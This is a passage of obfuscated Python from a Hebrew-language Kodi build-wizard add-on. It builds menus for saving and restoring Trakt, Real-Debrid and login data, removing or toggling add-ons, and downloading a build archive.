	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO0OO00O0O0O0O000 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O000OOO00OO00O0O0 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת פליליסט לאודר:  '%OOOOO00OOOOO0O0OO .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת הגדרות באפר: '%OO00OOO0OOO0000OO .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3151
	addFile ('%s שמירת רשימות ריפו:  '%O0000OO0000O0OO0O .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3153
	setView ('files','viewType')#line:3155
def traktMenu ():#line:3157
	O0O0O0O00000OO000 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3158
	O000OOO00OO0O0OOO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3159
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3160
	addFile ('Save Trakt Data: %s'%O0O0O0O00000OO000 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3161
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O000OOO00OO0O0OOO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3162
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3163
	for O0O0O0O00000OO000 in traktit .ORDER :#line:3165
		OO0OOOOOOO000O0OO =TRAKTID [O0O0O0O00000OO000 ]['name']#line:3166
		OOO0OOO000OOO00OO =TRAKTID [O0O0O0O00000OO000 ]['path']#line:3167
		OOO0OOOOO00O0O0OO =TRAKTID [O0O0O0O00000OO000 ]['saved']#line:3168
		O0O0OOOOOO0OOO0O0 =TRAKTID [O0O0O0O00000OO000 ]['file']#line:3169
		OOO0O0O00OO000OO0 =wiz .getS (OOO0OOOOO00O0O0OO )#line:3170
		OO00OOO00OOO0000O =traktit .traktUser (O0O0O0O00000OO000 )#line:3171
		O0O000OO00000O0O0 =TRAKTID [O0O0O0O00000OO000 ]['icon']if os .path .exists (OOO0OOO000OOO00OO )else ICONTRAKT #line:3172
		OOO000OOOO0OOO00O =TRAKTID [O0O0O0O00000OO000 ]['fanart']if os .path .exists (OOO0OOO000OOO00OO )else FANART #line:3173
		O00O0000000OOO0OO =createMenu ('saveaddon','Trakt',O0O0O0O00000OO000 )#line:3174
		OOOOOOO0OOO0O00OO =createMenu ('save','Trakt',O0O0O0O00000OO000 )#line:3175
		O00O0000000OOO0OO .append ((THEME2 %'%s Settings'%OO0OOOOOOO000O0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0O0O0O00000OO000 )))#line:3176
		addFile ('[+]-> %s'%OO0OOOOOOO000O0OO ,'',icon =O0O000OO00000O0O0 ,fanart =OOO000OOOO0OOO00O ,themeit =THEME3 )#line:3178
		if not os .path .exists (OOO0OOO000OOO00OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O000OO00000O0O0 ,fanart =OOO000OOOO0OOO00O ,menu =O00O0000000OOO0OO )#line:3179
		elif not OO00OOO00OOO0000O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0O0O0O00000OO000 ,icon =O0O000OO00000O0O0 ,fanart =OOO000OOOO0OOO00O ,menu =O00O0000000OOO0OO )#line:3180
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00OOO00OOO0000O ,'authtrakt',O0O0O0O00000OO000 ,icon =O0O000OO00000O0O0 ,fanart =OOO000OOOO0OOO00O ,menu =O00O0000000OOO0OO )#line:3181
		if OOO0O0O00OO000OO0 =="":#line:3182
			if os .path .exists (O0O0OOOOOO0OOO0O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0O0O0O00000OO000 ,icon =O0O000OO00000O0O0 ,fanart =OOO000OOOO0OOO00O ,menu =OOOOOOO0OOO0O00OO )#line:3183
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0O0O0O00000OO000 ,icon =O0O000OO00000O0O0 ,fanart =OOO000OOOO0OOO00O ,menu =OOOOOOO0OOO0O00OO )#line:3184
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0O0O00OO000OO0 ,'',icon =O0O000OO00000O0O0 ,fanart =OOO000OOOO0OOO00O ,menu =OOOOOOO0OOO0O00OO )#line:3185
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3187
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3188
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3189
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3190
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3191
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3192
	setView ('files','viewType')#line:3193
def realMenu ():#line:3195
	O00OO0OO0O0OO0000 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3196
	OOOO000OO0O00O00O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3197
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3198
	addFile ('Save Real Debrid Data: %s'%O00OO0OO0O0OO0000 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3199
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOOO000OO0O00O00O ),'',icon =ICONREAL ,themeit =THEME3 )#line:3200
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3201
	for OOO000OO0O0OO0OOO in debridit .ORDER :#line:3203
		OOOOOOOO0OOOO0O0O =DEBRIDID [OOO000OO0O0OO0OOO ]['name']#line:3204
		OO000000OOO0OO0O0 =DEBRIDID [OOO000OO0O0OO0OOO ]['path']#line:3205
		OOOOOOOOOOO00O0OO =DEBRIDID [OOO000OO0O0OO0OOO ]['saved']#line:3206
		O0OOO0O0OO00O0OO0 =DEBRIDID [OOO000OO0O0OO0OOO ]['file']#line:3207
		OO000000000000OO0 =wiz .getS (OOOOOOOOOOO00O0OO )#line:3208
		O0O0000OO0O0000OO =debridit .debridUser (OOO000OO0O0OO0OOO )#line:3209
		O000O00O0OO00O000 =DEBRIDID [OOO000OO0O0OO0OOO ]['icon']if os .path .exists (OO000000OOO0OO0O0 )else ICONREAL #line:3210
		O0O0OOOOO000O0O00 =DEBRIDID [OOO000OO0O0OO0OOO ]['fanart']if os .path .exists (OO000000OOO0OO0O0 )else FANART #line:3211
		O0O00O0O00OO00O0O =createMenu ('saveaddon','Debrid',OOO000OO0O0OO0OOO )#line:3212
		OOOOO0O000O000O00 =createMenu ('save','Debrid',OOO000OO0O0OO0OOO )#line:3213
		O0O00O0O00OO00O0O .append ((THEME2 %'%s Settings'%OOOOOOOO0OOOO0O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOO000OO0O0OO0OOO )))#line:3214
		addFile ('[+]-> %s'%OOOOOOOO0OOOO0O0O ,'',icon =O000O00O0OO00O000 ,fanart =O0O0OOOOO000O0O00 ,themeit =THEME3 )#line:3216
		if not os .path .exists (OO000000OOO0OO0O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000O00O0OO00O000 ,fanart =O0O0OOOOO000O0O00 ,menu =O0O00O0O00OO00O0O )#line:3217
		elif not O0O0000OO0O0000OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOO000OO0O0OO0OOO ,icon =O000O00O0OO00O000 ,fanart =O0O0OOOOO000O0O00 ,menu =O0O00O0O00OO00O0O )#line:3218
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O0000OO0O0000OO ,'authdebrid',OOO000OO0O0OO0OOO ,icon =O000O00O0OO00O000 ,fanart =O0O0OOOOO000O0O00 ,menu =O0O00O0O00OO00O0O )#line:3219
		if OO000000000000OO0 =="":#line:3220
			if os .path .exists (O0OOO0O0OO00O0OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOO000OO0O0OO0OOO ,icon =O000O00O0OO00O000 ,fanart =O0O0OOOOO000O0O00 ,menu =OOOOO0O000O000O00 )#line:3221
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOO000OO0O0OO0OOO ,icon =O000O00O0OO00O000 ,fanart =O0O0OOOOO000O0O00 ,menu =OOOOO0O000O000O00 )#line:3222
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO000000000000OO0 ,'',icon =O000O00O0OO00O000 ,fanart =O0O0OOOOO000O0O00 ,menu =OOOOO0O000O000O00 )#line:3223
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3225
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3226
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3227
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3228
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3229
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3230
	setView ('files','viewType')#line:3231
def loginMenu ():#line:3233
	O00OOOOO00O00O00O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3234
	OOOO00O00OO0O000O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3235
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3236
	addFile ('Save Login Data: %s'%O00OOOOO00O00O00O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3237
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOOO00O00OO0O000O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3238
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3239
	for O00OOOOO00O00O00O in loginit .ORDER :#line:3241
		O00OO0OOO0OO000OO =LOGINID [O00OOOOO00O00O00O ]['name']#line:3242
		OO00OOOOOO00000O0 =LOGINID [O00OOOOO00O00O00O ]['path']#line:3243
		OO0OOOOOO00OO0O0O =LOGINID [O00OOOOO00O00O00O ]['saved']#line:3244
		OOO0OOO0O00OO0OOO =LOGINID [O00OOOOO00O00O00O ]['file']#line:3245
		OOOOOO0O00000O0O0 =wiz .getS (OO0OOOOOO00OO0O0O )#line:3246
		O00O0OOO0000OO000 =loginit .loginUser (O00OOOOO00O00O00O )#line:3247
		OOOOOOOO0OOOO00OO =LOGINID [O00OOOOO00O00O00O ]['icon']if os .path .exists (OO00OOOOOO00000O0 )else ICONLOGIN #line:3248
		OOOO0OO0O0000000O =LOGINID [O00OOOOO00O00O00O ]['fanart']if os .path .exists (OO00OOOOOO00000O0 )else FANART #line:3249
		O00OOO000O0O00000 =createMenu ('saveaddon','Login',O00OOOOO00O00O00O )#line:3250
		OO0OOOOOOO00O0OOO =createMenu ('save','Login',O00OOOOO00O00O00O )#line:3251
		O00OOO000O0O00000 .append ((THEME2 %'%s Settings'%O00OO0OOO0OO000OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O00OOOOO00O00O00O )))#line:3252
		addFile ('[+]-> %s'%O00OO0OOO0OO000OO ,'',icon =OOOOOOOO0OOOO00OO ,fanart =OOOO0OO0O0000000O ,themeit =THEME3 )#line:3254
		if not os .path .exists (OO00OOOOOO00000O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOOOOO0OOOO00OO ,fanart =OOOO0OO0O0000000O ,menu =O00OOO000O0O00000 )#line:3255
		elif not O00O0OOO0000OO000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O00OOOOO00O00O00O ,icon =OOOOOOOO0OOOO00OO ,fanart =OOOO0OO0O0000000O ,menu =O00OOO000O0O00000 )#line:3256
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O0OOO0000OO000 ,'authlogin',O00OOOOO00O00O00O ,icon =OOOOOOOO0OOOO00OO ,fanart =OOOO0OO0O0000000O ,menu =O00OOO000O0O00000 )#line:3257
		if OOOOOO0O00000O0O0 =="":#line:3258
			if os .path .exists (OOO0OOO0O00OO0OOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O00OOOOO00O00O00O ,icon =OOOOOOOO0OOOO00OO ,fanart =OOOO0OO0O0000000O ,menu =OO0OOOOOOO00O0OOO )#line:3259
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O00OOOOO00O00O00O ,icon =OOOOOOOO0OOOO00OO ,fanart =OOOO0OO0O0000000O ,menu =OO0OOOOOOO00O0OOO )#line:3260
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOOOO0O00000O0O0 ,'',icon =OOOOOOOO0OOOO00OO ,fanart =OOOO0OO0O0000000O ,menu =OO0OOOOOOO00O0OOO )#line:3261
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3263
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3264
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3265
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3266
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3267
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3268
	setView ('files','viewType')#line:3269
def fixUpdate ():#line:3271
	if KODIV <17 :#line:3272
		O0OO00O000O0O00O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3273
		try :#line:3274
			os .remove (O0OO00O000O0O00O0 )#line:3275
		except Exception as OO0OOO000OOO00000 :#line:3276
			wiz .log ("Unable to remove %s, Purging DB"%O0OO00O000O0O00O0 )#line:3277
			wiz .purgeDb (O0OO00O000O0O00O0 )#line:3278
	else :#line:3279
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3280
def removeAddonMenu ():#line:3282
	OOOO000000OO000O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3283
	O0OOOOO0O0OOOO0O0 =[];OOOOOOOO0O0OO000O =[]#line:3284
	for OO00O0O0OO00OO0O0 in sorted (OOOO000000OO000O0 ,key =lambda OOO00000000OO0OO0 :OOO00000000OO0OO0 ):#line:3285
		O000000OO0000O00O =os .path .split (OO00O0O0OO00OO0O0 [:-1 ])[1 ]#line:3286
		if O000000OO0000O00O in EXCLUDES :continue #line:3287
		elif O000000OO0000O00O in DEFAULTPLUGINS :continue #line:3288
		elif O000000OO0000O00O =='packages':continue #line:3289
		O0OO0O0OO0O0OO00O =os .path .join (OO00O0O0OO00OO0O0 ,'addon.xml')#line:3290
		if os .path .exists (O0OO0O0OO0O0OO00O ):#line:3291
			O0000OOOOO00OO0OO =open (O0OO0O0OO0O0OO00O )#line:3292
			OOO00OO000O0OO0O0 =O0000OOOOO00OO0OO .read ()#line:3293
			OO0000O0OOO0OO0OO =wiz .parseDOM (OOO00OO000O0OO0O0 ,'addon',ret ='id')#line:3294
			O00OO0O00OO0OO00O =O000000OO0000O00O if len (OO0000O0OOO0OO0OO )==0 else OO0000O0OOO0OO0OO [0 ]#line:3296
			try :#line:3297
				O0000OO00O0O0000O =xbmcaddon .Addon (id =O00OO0O00OO0OO00O )#line:3298
				O0OOOOO0O0OOOO0O0 .append (O0000OO00O0O0000O .getAddonInfo ('name'))#line:3299
				OOOOOOOO0O0OO000O .append (O00OO0O00OO0OO00O )#line:3300
			except :#line:3301
				pass #line:3302
	if len (O0OOOOO0O0OOOO0O0 )==0 :#line:3303
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3304
		return #line:3305
	if KODIV >16 :#line:3306
		O0OO000O0OO0OO00O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OOOOO0O0OOOO0O0 )#line:3307
	else :#line:3308
		O0OO000O0OO0OO00O =[];O00OO00OO00OOOOO0 =0 #line:3309
		OO0O0000O00OOOOO0 =["-- Click here to Continue --"]+O0OOOOO0O0OOOO0O0 #line:3310
		while not O00OO00OO00OOOOO0 ==-1 :#line:3311
			O00OO00OO00OOOOO0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0O0000O00OOOOO0 )#line:3312
			if O00OO00OO00OOOOO0 ==-1 :break #line:3313
			elif O00OO00OO00OOOOO0 ==0 :break #line:3314
			else :#line:3315
				OOO0OO000000OOOO0 =(O00OO00OO00OOOOO0 -1 )#line:3316
				if OOO0OO000000OOOO0 in O0OO000O0OO0OO00O :#line:3317
					O0OO000O0OO0OO00O .remove (OOO0OO000000OOOO0 )#line:3318
					OO0O0000O00OOOOO0 [O00OO00OO00OOOOO0 ]=O0OOOOO0O0OOOO0O0 [OOO0OO000000OOOO0 ]#line:3319
				else :#line:3320
					O0OO000O0OO0OO00O .append (OOO0OO000000OOOO0 )#line:3321
					OO0O0000O00OOOOO0 [O00OO00OO00OOOOO0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0OOOOO0O0OOOO0O0 [OOO0OO000000OOOO0 ])#line:3322
	if O0OO000O0OO0OO00O ==None :return #line:3323
	if len (O0OO000O0OO0OO00O )>0 :#line:3324
		wiz .addonUpdates ('set')#line:3325
		for OO00O000OOO00OOO0 in O0OO000O0OO0OO00O :#line:3326
			removeAddon (OOOOOOOO0O0OO000O [OO00O000OOO00OOO0 ],O0OOOOO0O0OOOO0O0 [OO00O000OOO00OOO0 ],True )#line:3327
		xbmc .sleep (1000 )#line:3329
		if INSTALLMETHOD ==1 :O00O000O0OOOOOO00 =1 #line:3331
		elif INSTALLMETHOD ==2 :O00O000O0OOOOOO00 =0 #line:3332
		else :O00O000O0OOOOOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3333
		if O00O000O0OOOOOO00 ==1 :wiz .reloadFix ('remove addon')#line:3334
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3335
def removeAddonDataMenu ():#line:3337
	if os .path .exists (ADDOND ):#line:3338
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3339
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3340
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3341
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3342
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3343
		OO00O000O0OO00OO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3344
		for O0O0OOOOOO0OO0OO0 in sorted (OO00O000O0OO00OO0 ,key =lambda OO0OOO0000OOOOO00 :OO0OOO0000OOOOO00 ):#line:3345
			O0OO0OO000O00OOO0 =O0O0OOOOOO0OO0OO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3346
			O0OO00OOOO0OO0O00 =os .path .join (O0O0OOOOOO0OO0OO0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3347
			O0O0O0000O0OO0000 =os .path .join (O0O0OOOOOO0OO0OO0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3348
			OOO0OO000O00OO000 =O0OO0OO000O00OOO0 #line:3349
			OO0OOOOO0O000OOO0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3350
			for O00OO0OOOO000O00O in OO0OOOOO0O000OOO0 :#line:3351
				OOO0OO000O00OO000 =OOO0OO000O00OO000 .replace (O00OO0OOOO000O00O ,OO0OOOOO0O000OOO0 [O00OO0OOOO000O00O ])#line:3352
			if O0OO0OO000O00OOO0 in EXCLUDES :OOO0OO000O00OO000 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOO0OO000O00OO000 #line:3353
			else :OOO0OO000O00OO000 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOO0OO000O00OO000 #line:3354
			addFile (' %s'%OOO0OO000O00OO000 ,'removedata',O0OO0OO000O00OOO0 ,icon =O0OO00OOOO0OO0O00 ,fanart =O0O0O0000O0OO0000 ,themeit =THEME2 )#line:3355
	else :#line:3356
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3357
	setView ('files','viewType')#line:3358
def enableAddons ():#line:3360
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3361
	O00OO0OOO00OO000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3362
	O0O000O00O00O00O0 =0 #line:3363
	for O0OOO0OOO0000OO00 in sorted (O00OO0OOO00OO000O ,key =lambda OO00000O0000000O0 :OO00000O0000000O0 ):#line:3364
		OO00O0OOO000O000O =os .path .split (O0OOO0OOO0000OO00 [:-1 ])[1 ]#line:3365
		if OO00O0OOO000O000O in EXCLUDES :continue #line:3366
		if OO00O0OOO000O000O in DEFAULTPLUGINS :continue #line:3367
		OO00O0O00OO00OOO0 =os .path .join (O0OOO0OOO0000OO00 ,'addon.xml')#line:3368
		if os .path .exists (OO00O0O00OO00OOO0 ):#line:3369
			O0O000O00O00O00O0 +=1 #line:3370
			O00OO0OOO00OO000O =O0OOO0OOO0000OO00 .replace (ADDONS ,'')[1 :-1 ]#line:3371
			O0O0OOO0O0O0OOO0O =open (OO00O0O00OO00OOO0 )#line:3372
			O000000OO00OO000O =O0O0OOO0O0O0OOO0O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3373
			O0O0OOOOOO00OO0OO =wiz .parseDOM (O000000OO00OO000O ,'addon',ret ='id')#line:3374
			OO0OOO0OO0OO0OO0O =wiz .parseDOM (O000000OO00OO000O ,'addon',ret ='name')#line:3375
			try :#line:3376
				O0O0OO0OOOOOO0000 =O0O0OOOOOO00OO0OO [0 ]#line:3377
				OO0OO0OO00OOOOO00 =OO0OOO0OO0OO0OO0O [0 ]#line:3378
			except :#line:3379
				continue #line:3380
			try :#line:3381
				O000OO000OOOOO0O0 =xbmcaddon .Addon (id =O0O0OO0OOOOOO0000 )#line:3382
				O0O0000O00O0O000O ="[COLOR green][Enabled][/COLOR]"#line:3383
				O0OOO00OO0O00OOOO ="false"#line:3384
			except :#line:3385
				O0O0000O00O0O000O ="[COLOR red][Disabled][/COLOR]"#line:3386
				O0OOO00OO0O00OOOO ="true"#line:3387
				pass #line:3388
			OO000OO00O0OO0O0O =os .path .join (O0OOO0OOO0000OO00 ,'icon.png')if os .path .exists (os .path .join (O0OOO0OOO0000OO00 ,'icon.png'))else ICON #line:3389
			OO0O00OOOO00O000O =os .path .join (O0OOO0OOO0000OO00 ,'fanart.jpg')if os .path .exists (os .path .join (O0OOO0OOO0000OO00 ,'fanart.jpg'))else FANART #line:3390
			addFile ("%s %s"%(O0O0000O00O0O000O ,OO0OO0OO00OOOOO00 ),'toggleaddon',O00OO0OOO00OO000O ,O0OOO00OO0O00OOOO ,icon =OO000OO00O0OO0O0O ,fanart =OO0O00OOOO00O000O )#line:3391
			O0O0OOO0O0O0OOO0O .close ()#line:3392
	if O0O000O00O00O00O0 ==0 :#line:3393
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3394
	setView ('files','viewType')#line:3395
def changeFeq ():#line:3397
	O00O0OOO00OO00OOO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3398
	O000000OOOO00OOO0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O00O0OOO00OO00OOO )#line:3399
	if not O000000OOOO00OOO0 ==-1 :#line:3400
		wiz .setS ('autocleanfeq',str (O000000OOOO00OOO0 ))#line:3401
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O00O0OOO00OO00OOO [O000000OOOO00OOO0 ]))#line:3402
def developer ():#line:3404
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3405
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3406
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3407
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3408
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3409
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3410
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3411
	setView ('files','viewType')#line:3413
def download (O00OO0O0OO00OO000 ,O0O00OO0OOO0O00OO ):#line:3418
  O00000O0O0000O000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3419
  O0OOO00O0OO00OOOO =xbmcgui .DialogProgress ()#line:3420
  O0OOO00O0OO00OOOO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3421
  OOO0000O00OO00000 =os .path .join (O00000O0O0000O000 ,'isr.zip')#line:3422
  O000000O00O0OOO0O =urllib2 .Request (O00OO0O0OO00OO000 )#line:3423
  O0OOO000OOO0OOOO0 =urllib2 .urlopen (O000000O00O0OOO0O )#line:3424
  OO00O0OOO0O0O0OOO =xbmcgui .DialogProgress ()#line:3426
  OO00O0OOO0O0O0OOO .create ("Downloading","Downloading "+name )#line:3427
  OO00O0OOO0O0O0OOO .update (0 )#line:3428
  O00O00O000000O000 =O0O00OO0OOO0O00OO #line:3429
  O000000O000O0OO00 =open (OOO0000O00OO00000 ,'wb')#line:3430
  try :#line:3432
    OOO00OO0OOO000O00 =O0OOO000OOO0OOOO0 .info ().getheader ('Content-Length').strip ()#line:3433
    O00O0O0000OO00O0O =True #line:3434
  except AttributeError :#line:3435
        O00O0O0000OO00O0O =False #line:3436
  if O00O0O0000OO00O0O :#line:3438
        OOO00OO0OOO000O00 =int (OOO00OO0OOO000O00 )#line:3439
  O0OOOO0OOOOO0O0O0 =0 #line:3441
  O0O0OOO00O000OO00 =time .time ()#line:3442
  while True :#line:3443
        OOO0O00O0O00OOO00 =O0OOO000OOO0OOOO0 .read (8192 )#line:3444
        if not OOO0O00O0O00OOO00 :#line:3445
            sys .stdout .write ('\n')#line:3446
            break #line:3447
        O0OOOO0OOOOO0O0O0 +=len (OOO0O00O0O00OOO00 )#line:3449
        O000000O000O0OO00 .write (OOO0O00O0O00OOO00 )#line:3450
        if not O00O0O0000OO00O0O :#line:3452
            OOO00OO0OOO000O00 =O0OOOO0OOOOO0O0O0 #line:3453
        if OO00O0OOO0O0O0OOO .iscanceled ():#line:3454
           OO00O0OOO0O0O0OOO .close ()#line:3455
           try :#line:3456
            os .remove (OOO0000O00OO00000 )#line:3457
           except :#line:3458
            pass #line:3459
           break #line:3460
        OOO00000OO0O0OO00 =float (O0OOOO0OOOOO0O0O0 )/OOO00OO0OOO000O00 #line:3461
        OOO00000OO0O0OO00 =round (OOO00000OO0O0OO00 *100 ,2 )#line:3462
        O0OO00O0OOO00O000 =O0OOOO0OOOOO0O0O0 /(1024 *1024 )#line:3463
